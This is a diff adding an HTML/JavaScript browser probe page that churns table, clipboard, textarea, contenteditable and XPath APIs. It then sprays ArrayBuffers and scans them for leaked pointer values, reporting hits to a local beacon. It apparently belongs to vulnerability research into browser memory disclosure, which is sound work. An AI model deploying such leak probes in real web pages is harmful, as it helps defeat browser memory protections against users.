@@ -1,0 +1,437 @@
+<!--
+  p788: Table DOM / DataTransfer / Clipboard / textarea / contenteditable residue
+
+  HTMLTableElement maintains C++ HTMLTableSectionElement (thead/tbody/
+  tfoot) and HTMLTableRowElement/HTMLTableCellElement objects. The
+  insertRow/deleteRow/insertCell/deleteCell methods exercise the
+  table's internal C++ row/cell collection caches. createTHead/
+  createTFoot/deleteTHead/deleteTFoot exercise section management.
+  The table DOM is one of the few compound-structure DOM APIs where
+  the browser maintains auxiliary C++ index structures beyond the
+  normal child list.
+
+  DataTransfer: created by drag events and clipboard events. Each
+  DataTransfer holds C++ DataTransferItemList with DataTransferItem
+  objects containing typed data (text/plain, text/html, Files).
+  The items are C++ objects with separate backing for string data
+  vs file data. Clipboard API (navigator.clipboard) uses similar
+  internal DataTransfer plumbing.
+
+  textarea: HTMLTextAreaElement maintains a C++ text editing state
+  with undo/redo stacks, selection range, scroll position, and
+  line-break normalization state. Rapid value changes exercise the
+  internal text buffer allocator.
+
+  contenteditable: elements with contentEditable=true activate the
+  C++ Editor/FrameSelection/EditCommand subsystem. execCommand()
+  creates C++ EditCommand objects (InsertText, Delete, FormatBlock,
+  Bold, Italic, etc.) that maintain undo state. Each command
+  allocates C++ SimpleEditCommand records in an undo stack.
+
+  XPathEvaluator: creates C++ XPathExpression objects with compiled
+  ASTs. evaluate() on a DOM tree allocates C++ XPathResult with
+  node snapshots.
+
+  Attack angles:
+  A) Table insertRow/deleteRow/insertCell churn.
+  B) DataTransfer/ClipboardEvent item list residue.
+  C) textarea value/selection/undo state churn.
+  D) contenteditable execCommand undo stack residue.
+  E) XPathEvaluator expression compile/evaluate churn.
+  F) Table caption/colgroup/section management churn.
+
+  CRASH_CLASS: LOW (table/clipboard/editing APIs, no side effects)
+  prior art: p783 (Selection/Range), p785 (DocumentFragment)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p788</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+function sprayAndScan(tag,round,sizes){
+  var hits=0;
+  for(var si=0;si<sizes.length;si++){
+    var sz=sizes[si];
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(sz);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=sz;off+=8){
+        if(isPtr(dv,off)){
+          hits++;
+          if(hits<=2)b(tag+'-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+  }
+  return hits;
+}
+
+window.onload=function(){
+b('p788-START');
+
+// === Section A: Table insertRow/deleteRow/insertCell churn ===
+try{
+  b('A-table');
+  var aHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var table=document.createElement('table');
+      document.body.appendChild(table);
+
+      // Build a 30x10 table
+      for(var r=0;r<30;r++){
+        var row=table.insertRow(-1);
+        for(var c=0;c<10;c++){
+          var cell=row.insertCell(-1);
+          cell.textContent='r'+r+'c'+c+'_'+round;
+          cell.setAttribute('data-row',String(r));
+          cell.setAttribute('data-col',String(c));
+        }
+      }
+
+      if(round===0){
+        b('A table rows='+table.rows.length+' cells_per_row='+table.rows[0].cells.length);
+      }
+
+      // Delete rows from middle (exercises index cache updates)
+      for(var r=14;r>=5;r--){
+        table.deleteRow(r);
+      }
+
+      // Insert new rows at various positions
+      for(var r=0;r<10;r++){
+        var row=table.insertRow(r%table.rows.length);
+        for(var c=0;c<10;c++){
+          var cell=row.insertCell(-1);
+          cell.textContent='new_r'+r+'c'+c;
+        }
+      }
+
+      // Delete cells from random rows
+      for(var r=0;r<Math.min(10,table.rows.length);r++){
+        var row=table.rows[r];
+        while(row.cells.length>3){
+          row.deleteCell(row.cells.length-1);
+        }
+      }
+
+      if(round===0)b('A after churn: rows='+table.rows.length);
+
+      document.body.removeChild(table);
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    aHits+=sprayAndScan('A',round,[32,48,64,96,128]);
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: DataTransfer / ClipboardEvent item list residue ===
+try{
+  b('B-datatransfer');
+  var bHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      // Create DataTransfer objects via drag event simulation
+      var transfers=[];
+
+      for(var i=0;i<50;i++){
+        try{
+          // ClipboardEvent with DataTransfer
+          var evt=new ClipboardEvent('paste',{
+            clipboardData:new DataTransfer()
+          });
+          var dt=evt.clipboardData;
+          if(dt&&dt.items){
+            dt.items.add('text_data_'+round+'_'+i+'_'+'t'.repeat(40),'text/plain');
+            dt.items.add('<b>html_'+round+'_'+i+'</b>','text/html');
+            transfers.push(dt);
+          }
+        }catch(e){
+          // Fallback: try DragEvent
+          if(i===0){
+            try{
+              var de=new DragEvent('drop',{dataTransfer:new DataTransfer()});
+              var dt2=de.dataTransfer;
+              if(dt2){
+                dt2.items.add('drag_data_'+round,'text/plain');
+                transfers.push(dt2);
+              }
+            }catch(e2){
+              if(round===0)b('B dt_err='+e.message+' de_err='+e2.message);
+            }
+          }
+        }
+      }
+
+      if(round===0)b('B created '+transfers.length+' DataTransfer objects with items');
+
+      // Clear all items
+      for(var i=0;i<transfers.length;i++){
+        try{transfers[i].clearData();}catch(e){}
+      }
+      transfers=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    bHits+=sprayAndScan('B',round,[32,48,64,96]);
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: textarea value/selection/undo state churn ===
+try{
+  b('C-textarea');
+  var cHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var textareas=[];
+
+      for(var i=0;i<40;i++){
+        var ta=document.createElement('textarea');
+        ta.rows=5;
+        ta.cols=40;
+        document.body.appendChild(ta);
+
+        // Rapid value changes to exercise internal buffer
+        for(var j=0;j<20;j++){
+          ta.value='line1_'+round+'_'+i+'_'+j+'\nline2_'+'x'.repeat(30+j)+'\nline3_end';
+        }
+
+        // Selection manipulation
+        try{
+          ta.setSelectionRange(0,ta.value.length);
+          ta.setSelectionRange(5,15);
+          ta.selectionStart=0;
+          ta.selectionEnd=10;
+          ta.selectionDirection='forward';
+        }catch(e){}
+
+        // Scroll position
+        try{
+          ta.scrollTop=0;
+          ta.scrollLeft=0;
+        }catch(e){}
+
+        // Clear
+        ta.value='';
+        textareas.push(ta);
+      }
+
+      if(round===0)b('C churned '+textareas.length+' textareas x 20 value changes each');
+
+      for(var i=0;i<textareas.length;i++){
+        document.body.removeChild(textareas[i]);
+      }
+      textareas=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    cHits+=sprayAndScan('C',round,[32,48,64,96]);
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: contenteditable execCommand undo stack residue ===
+try{
+  b('D-execcommand');
+  var dHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var div=document.createElement('div');
+      div.contentEditable='true';
+      div.style.cssText='width:300px;height:200px;border:1px solid black;';
+      document.body.appendChild(div);
+
+      // Focus and build content
+      try{div.focus();}catch(e){}
+      div.innerHTML='Initial content for round '+round+'. ';
+
+      var commands=['bold','italic','underline','strikeThrough',
+        'insertUnorderedList','insertOrderedList','indent','outdent',
+        'justifyLeft','justifyCenter','justifyRight','justifyFull',
+        'removeFormat','insertHorizontalRule'];
+
+      // Execute commands to build undo stack
+      for(var i=0;i<30;i++){
+        try{
+          // Insert text
+          document.execCommand('insertText',false,'word_'+round+'_'+i+' ');
+        }catch(e){}
+
+        var cmd=commands[i%commands.length];
+        try{
+          document.execCommand(cmd,false,null);
+        }catch(e){}
+      }
+
+      if(round===0){
+        b('D executed 30 insertText + 30 format commands');
+        b('D content_len='+div.innerHTML.length);
+      }
+
+      // Undo everything (exercises undo stack traversal)
+      for(var i=0;i<30;i++){
+        try{document.execCommand('undo',false,null);}catch(e){}
+      }
+
+      // Redo some
+      for(var i=0;i<10;i++){
+        try{document.execCommand('redo',false,null);}catch(e){}
+      }
+
+      document.body.removeChild(div);
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    dHits+=sprayAndScan('D',round,[48,64,96,128]);
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: XPathEvaluator expression compile/evaluate churn ===
+try{
+  b('E-xpath');
+  var eHits=0;
+
+  // Build a tree to evaluate against
+  var tree=document.createElement('div');
+  tree.id='xptree';
+  for(var i=0;i<20;i++){
+    var sec=document.createElement('section');
+    sec.className='sec_'+i;
+    sec.setAttribute('data-idx',String(i));
+    for(var j=0;j<5;j++){
+      var p=document.createElement('p');
+      p.textContent='paragraph_'+i+'_'+j;
+      p.className=(j%2===0)?'even':'odd';
+      sec.appendChild(p);
+    }
+    tree.appendChild(sec);
+  }
+  document.body.appendChild(tree);
+
+  var xpaths=[
+    '//section',
+    '//section[@data-idx>"10"]',
+    '//p[contains(text(),"paragraph")]',
+    '//section/p[@class="even"]',
+    '//section[position()>5 and position()<15]/p',
+    '//*[@class]',
+    '//p[starts-with(text(),"paragraph_1")]',
+    '//section[last()]',
+    'count(//p)',
+    'string(//section[1]/p[1])',
+    '//section[@data-idx mod 3 = 0]',
+    '//p[not(@class="even")]',
+    '//section[p[@class="odd"]]',
+    '//section[@data-idx="5"]/following-sibling::section[1]',
+    '//section[@data-idx="10"]/preceding-sibling::section[1]'
+  ];
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var results=[];
+
+      for(var xi=0;xi<xpaths.length;xi++){
+        for(var rep=0;rep<5;rep++){
+          try{
+            var evaluator=new XPathEvaluator();
+            var expr=evaluator.createExpression(xpaths[xi],null);
+            var result=expr.evaluate(tree,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);
+
+            if(round===0&&rep===0&&xi<3){
+              b('E xpath['+xi+'] snapshot_len='+result.snapshotLength);
+            }
+
+            results.push(result);
+          }catch(e){
+            if(round===0&&rep===0)b('E xpath_err['+xi+']='+e.message);
+          }
+        }
+      }
+
+      if(round===0)b('E evaluated '+results.length+' XPath expressions');
+      results=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    eHits+=sprayAndScan('E',round,[48,64,96,128]);
+  }
+
+  document.body.removeChild(tree);
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: Table caption/colgroup/section management churn ===
+try{
+  b('F-table-sections');
+  var fHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var table=document.createElement('table');
+      document.body.appendChild(table);
+
+      // Create and destroy sections repeatedly
+      for(var i=0;i<20;i++){
+        var thead=table.createTHead();
+        var r=thead.insertRow(-1);
+        for(var c=0;c<5;c++){
+          var cell=r.insertCell(-1);
+          cell.textContent='th_'+round+'_'+i+'_'+c;
+        }
+
+        var tfoot=table.createTFoot();
+        var fr=tfoot.insertRow(-1);
+        for(var c=0;c<5;c++){
+          var cell=fr.insertCell(-1);
+          cell.textContent='tf_'+round+'_'+i+'_'+c;
+        }
+
+        var caption=table.createCaption();
+        caption.textContent='Caption '+round+'-'+i;
+
+        // Add body rows
+        var tbody=table.createTBody();
+        for(var r2=0;r2<3;r2++){
+          var row=tbody.insertRow(-1);
+          for(var c=0;c<5;c++){
+            row.insertCell(-1).textContent='bd_'+r2+'_'+c;
+          }
+        }
+
+        // Delete sections
+        table.deleteTHead();
+        table.deleteTFoot();
+        table.deleteCaption();
+      }
+
+      if(round===0)b('F created/destroyed 20 thead+tfoot+caption+tbody cycles');
+
+      document.body.removeChild(table);
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    fHits+=sprayAndScan('F',round,[32,48,64,96,128]);
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p788-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
